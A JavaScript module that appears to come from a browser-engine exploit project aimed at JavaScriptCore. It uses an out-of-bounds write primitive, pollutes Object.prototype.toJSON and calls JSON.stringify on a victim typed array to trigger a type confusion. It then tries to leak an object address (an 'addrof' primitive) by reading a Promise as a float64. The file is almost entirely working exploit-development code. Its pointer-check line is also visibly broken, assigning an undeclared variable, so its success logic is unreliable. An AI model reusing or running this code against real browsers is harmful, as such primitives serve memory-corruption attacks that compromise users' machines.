// js/script3/testArrayBufferVictimCrash.mjs (v69_StableC1_AggressivePromiseLeak)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment,
    getStableConfusedArrayBuffer
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V69_SCAPL = "OriginalHeisenbug_TypedArrayAddrof_v69_StableC1_AggressivePromiseLeak";

// Variáveis globais/módulo
let actual_confused_ab_target_v69 = null; // O objeto que getStableConfusedArrayBuffer retorna (esperado ser Promise)

let victim_typed_array_ref_v69 = null;
let probe_call_count_v69 = 0;
let all_probe_interaction_details_v69 = [];
let first_call_details_object_ref_v69 = null; // Referência ao C1_details

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;
const PROBE_CALL_LIMIT_V69 = 5; // Erro de circularidade deve ocorrer antes

function toJSON_TA_Probe_StableC1_AggressivePromiseLeak_v69() {
    probe_call_count_v69++;
    const call_num = probe_call_count_v69;
    let current_call_details = { // Objeto local para esta chamada da sonda
        call_number: call_num,
        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V69_SCAPL,
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v69),
        this_is_C1: (this === first_call_details_object_ref_v69 && first_call_details_object_ref_v69 !== null),
        attempted_f64_leak_val: null,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. Type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1? ${current_call_details.this_is_C1}.`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V69) { all_probe_interaction_details_v69.push({...current_call_details}); return { recursion_stopped_v69: true, call: call_num }; }

        // Caso 1: 'this' é a vítima original (primeira chamada)
        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Victim. Creating C1_details & adding self_ref.`, "info");
            first_call_details_object_ref_v69 = current_call_details;
            current_call_details.self_ref = current_call_details; // Adiciona auto-referência para estabilizar Call #2
            all_probe_interaction_details_v69.push({...current_call_details});
            return current_call_details;
        }
        // Caso 2: 'this' é o C1_details (type-confused) - Esperado na Call #2
        else if (current_call_details.this_is_C1 && current_call_details.this_type === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON C1_DETAILS ('this')! Assigning Promise payload & attempting f64 conversion...`, "vuln");

            if (actual_confused_ab_target_v69) {
                this.payload_ThePromise = actual_confused_ab_target_v69;

                let f64_arr = new Float64Array(1);
                try {
                    f64_arr[0] = actual_confused_ab_target_v69; // Tenta "converter" a Promise para double
                    this.leaked_promise_as_f64 = f64_arr[0]; // Pode ser NaN
                    current_call_details.attempted_f64_leak_val = this.leaked_promise_as_f64;
                    logS3(`[PROBE Call#${call_num}] Attempted f64 conversion of Promise payload: ${this.leaked_promise_as_f64}`, "info");
                } catch (e_conv) {
                    this.leaked_promise_as_f64 = `ErrorConv: ${e_conv.message}`;
                    current_call_details.attempted_f64_leak_val = `ErrorConv: ${e_conv.message}`;
                    logS3(`[PROBE Call#${call_num}] Error converting Promise payload to f64: ${e_conv.message}`, "error");
                }
            } else {
                logS3(`[PROBE Call#${call_num}] actual_confused_ab_target_v69 is null, skipping payload assignment and f64 conversion.`, "warn");
                current_call_details.attempted_f64_leak_val = "ConfusedAB was null";
            }
            // Manter self_ref para que JSON.stringify principal falhe aqui, APÓS modificações.
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: C1_details modified. Keys: ${Object.keys(this).join(',')}`, "info");
            all_probe_interaction_details_v69.push({...current_call_details});
            return this; // Retorna C1_details modificado (ainda com self_ref)
        }
        // Outros casos
        else {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected: ${current_call_details.this_type}. Ret marker.`, "warn");
            all_probe_interaction_details_v69.push({...current_call_details});
            return `ProcessedCall${call_num}_Type${current_call_details.this_type.replace(/[^a-zA-Z0-9]/g, '')}`;
        }
    } catch (e_probe) {
        current_call_details.error_in_probe = e_probe.message;
        const FNAME_REF = FNAME_MODULE_TYPEDARRAY_ADDROF_V69_SCAPL;
        logS3(`[${FNAME_REF}] Probe Call #${call_num}: CRIT ERR: ${e_probe.name} - ${e_probe.message}`, "critical", FNAME_REF);
        all_probe_interaction_details_v69.push({...current_call_details});
        return { error_marker_v69: call_num, error_msg: e_probe.message };
    }
}

export async function executeTypedArrayVictimAddrofTest_StableC1_AggressivePromiseLeak() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V69_SCAPL}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (StableC1_AggressivePromiseLeak) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V69_SCAPL} Init...`;

    // Resetar
    probe_call_count_v69 = 0;
    all_probe_interaction_details_v69 = []; // Importante resetar
    victim_typed_array_ref_v69 = null;
    first_call_details_object_ref_v69 = null;
    actual_confused_ab_target_v69 = null;

    let tempOriginalToJSON_getter = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    logS3(`[${FNAME_CURRENT_TEST}] Tentando obter Confused ArrayBuffer (que vira Promise) do core_exploit...`, "info");
    actual_confused_ab_target_v69 = getStableConfusedArrayBuffer();
    if (tempOriginalToJSON_getter) Object.defineProperty(Object.prototype, 'toJSON', tempOriginalToJSON_getter); else delete Object.prototype.toJSON;

    let initial_confused_ab_type = "null_or_undefined";
    if (actual_confused_ab_target_v69 !== null && actual_confused_ab_target_v69 !== undefined) {
        initial_confused_ab_type = Object.prototype.toString.call(actual_confused_ab_target_v69);
        logS3(`[${FNAME_CURRENT_TEST}] actual_confused_ab_target_v69 RETORNADO. Tipo inicial ANTES do teste principal: ${initial_confused_ab_type}`, "debug");
    } else {
        logS3(`[${FNAME_CURRENT_TEST}] getStableConfusedArrayBuffer RETORNOU null/undefined. O teste pode não ser significativo para o ConfusedAB.`, "warn");
        // O teste prosseguirá, mas payload_ThePromise no C1_details será null.
    }

    let errorCapturedMain = null;
    let rawStringifyOutput = "N/A", stringifyOutput_parsed = null;
    let collected_probe_details_for_return = [];
    let addrof_A_result = { success: false, msg: "Addrof PromiseInC1: Default (v69)" };
    // addrof_B_result não é usado nesta versão pois não temos um segundo payload principal
    let pollutionApplied = false, originalToJSONDescriptor = null;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write for main test.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);
        victim_typed_array_ref_v69 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_StableC1_AggressivePromiseLeak_v69, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v69)...`, "info", FNAME_CURRENT_TEST);

            try {
                rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v69);
                // Se chegarmos aqui, a circularidade esperada NÃO ocorreu, o que é inesperado para esta v69
                logS3(`  JSON.stringify completed UNEXPECTEDLY. Raw Output: ${rawStringifyOutput}`, "warn", FNAME_CURRENT_TEST);
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput);
            } catch (e_stringify_main) {
                errorCapturedMain = e_stringify_main;
                rawStringifyOutput = `ERROR_DURING_STRINGIFY: ${e_stringify_main.message}`;
                logS3(`  JSON.stringify FAILED ( esperado se self_ref funcionou :) ): ${e_stringify_main.name} - ${e_stringify_main.message}`, "vuln", FNAME_CURRENT_TEST);
                stringifyOutput_parsed = { error_stringify: rawStringifyOutput };
            }

            logS3("STEP 3: Analyzing C1_details from memory (v69)...", "warn", FNAME_CURRENT_TEST);
            let heisenbugOnC1 = false;
            let attempted_leak_value = "N/A";

            const call2Details = all_probe_interaction_details_v69.find(d => d.call_number === 2 && d.this_is_C1);
            if (call2Details) {
                heisenbugOnC1 = true;
                logS3(`  EXECUTE: HEISENBUG on C1_details (Call #2) CONFIRMED!`, "vuln", FNAME_CURRENT_TEST);
                // Acessar o valor de `leaked_promise_as_f64` diretamente do objeto C1_details referenciado
                if (first_call_details_object_ref_v69 && first_call_details_object_ref_v69.hasOwnProperty('leaked_promise_as_f64')) {
                    attempted_leak_value = first_call_details_object_ref_v69.leaked_promise_as_f64;
                    logS3(`  Value of C1_details.leaked_promise_as_f64 from memory: ${attempted_leak_value}`, "info");

                    if (typeof attempted_leak_value === 'number' && !isNaN(attempted_leak_value) && attempted_leak_value !== 0) {
                        let ptr = new AdvancedInt64(new Uint32Array(new Float64Array([attempted_leak_value]).buffer)[0], new Uint32Array(new Float64Array([attempted_leak_value]).buffer)[1]);
                        // Aplicar validação de ponteiro
                        let isPotentialPtr=false; if(JSC_OFFSETS.JSValue?.HEAP_POINTER_TAG_HIGH!==undefined){isPtr=(ptr.high()===JSC_OFFSETS.JSValue.HEAP_POINTER_TAG_HIGH&&(ptr.low()&JSC_OFFSETS.JSValue.TAG_MASK)===JSC_OFFSETS.JSValue.CELL_TAG);} if(!isPtr&&(ptr.high()>0||ptr.low()>0x10000)&&(ptr.high()<0x000F0000)&&((ptr.low()&0x7)===0)){isPtr=true;}
                        if(isPotentialPtr){
                            addrof_A_result.success = true;
                            addrof_A_result.msg = `V69 SUCCESS (Promise as F64 in C1): Potential Ptr ${ptr.toString(true)}`;
                        } else { addrof_A_result.msg = `V69 PromiseAsF64 (${attempted_leak_value} / ${ptr.toString(true)}) not ptr pattern.`; }
                    } else { addrof_A_result.msg = `V69 PromiseAsF64 is not useful num: ${attempted_leak_value}`; }
                } else { addrof_A_result.msg = "V69 C1_details.leaked_promise_as_f64 not found in memory ref."; }
            } else {
                logS3(`  EXECUTE: ALERT: Heisenbug on C1_details (Call #2) NOT confirmed. Addrof attempt skipped.`, "error", FNAME_CURRENT_TEST);
                addrof_A_result.msg = "V69 Heisenbug on C1 (Call #2) not confirmed.";
            }

            if(addrof_A_result.success){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V69_SCAPL}: Addr SUCCESS!`;}
            else if(heisenbugOnC1 || (errorCapturedMain && errorCapturedMain.message.includes("circular structure"))){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V69_SCAPL}: Heisenbug OK, Addr Fail`;}
            else{document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V69_SCAPL}: No Heisenbug?`;}

        } catch (e) { errorCapturedMain = e; /* ... */ } finally { /* ... */ }
    } catch (e) { errorCapturedMain = e; /* ... */ }
    finally {
        if (all_probe_interaction_details_v69 && Array.isArray(all_probe_interaction_details_v69)) {
            collected_probe_details_for_return = all_probe_interaction_details_v69.map(d => ({ ...d }));
        } else { collected_probe_details_for_return = []; }
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v69}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A (PromiseInC1): Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        // Limpeza
        victim_typed_array_ref_v69 = null; all_probe_interaction_details_v69 = []; probe_call_count_v69 = 0; first_call_details_object_ref_v69 = null; actual_confused_ab_target_v69 = null;
    }
    return {
        errorCapturedMain: errorCapturedMain,
        stringifyResult: stringifyOutput_parsed,
        rawStringifyForAnalysis: rawStringifyOutput,
        all_probe_calls_for_analysis: collected_probe_details_for_return,
        total_probe_calls: probe_call_count_v69,
        addrof_A_result: addrof_A_result,
        addrof_B_result: {success: false, msg: "N/A for v69"} // Não há alvo B direto
    };
};
